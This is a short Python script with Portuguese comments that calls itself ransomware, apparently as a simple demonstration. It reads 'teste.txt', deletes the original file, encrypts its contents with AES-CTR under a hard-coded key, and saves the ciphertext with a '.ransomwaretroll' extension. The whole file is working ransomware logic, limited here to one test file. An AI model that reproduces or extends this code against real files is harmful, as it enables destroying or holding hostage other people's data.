import os
import pyaes

## Abrir o arquivo a ser criptografado

file_name = "teste.txt" 
file = open(file_name, "rb") ## Abrir o arquivo
file_data = file.read() ## Ler o conteudo
file.close() ## Fechar o arquivo

## Remover o arquivo

os.remove(file_name) ## Exclusao do arquivo

## Definir a chave de criptografia

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key) ## Funcao para criptografr arquivo

## Criptografar o arquivo

crypto_data = aes.encrypt(file_data) ## Criptografia do arquivo teste.txt

## Salvar o arquivo criptografado

new_file = file_name + ".ransomwaretroll" ## Cria um novo arquivo
new_file = open(f'{new_file}','wb') ## Abrir o arquivo
new_file.write(crypto_data) ## Escrever o conteudo criptografado
new_file.close() ## Fechar o arquivo
